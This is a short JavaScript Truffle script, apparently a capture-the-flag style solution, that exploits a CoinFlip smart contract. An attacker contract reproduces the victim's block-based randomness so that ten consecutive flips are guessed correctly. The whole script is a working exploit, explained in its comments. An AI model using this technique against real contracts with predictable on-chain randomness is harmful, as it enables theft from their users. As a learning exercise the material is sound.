const CoinFlipContract = artifacts.require('CoinFlip')
const CoinFlipAttackContract = artifacts.require('CoinFlipAttack')
const assert = require('assert')

async function execute(callback) {
    /**
     * Some help: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620
     * The idea is to have an attacker contract with exactly the same PRNG 
     * as in CoinFlip's flip function.
     * 
     * The attack works because the executions of the flips in attacker and victim contracts are done in the
     * same transaction in the same block.
     * 
     * Thus, we use the result of the flip in the attacker contract as
     * the input to the victim contract and successfuly "guess" the side.
     */

    // Instance victim and attacker contract
    let victimContract = await CoinFlipContract.deployed()
    let attackerContract = await CoinFlipAttackContract.deployed()

    await attackerContract.setVictim(victimContract.address)

    // Flip the coin 10 times
    for (let index = 0; index < 10; index++) {
        // Check CoinFlipAttack.sol to see this 'flip' function implementation
        await attackerContract.flip()
    }

    // Check how many times we won
    let wins = await victimContract.consecutiveWins.call()
    assert.equal(wins.toNumber(), 10)
    console.log(`Great! We won ${wins} times.`)

    callback()
}

module.exports = execute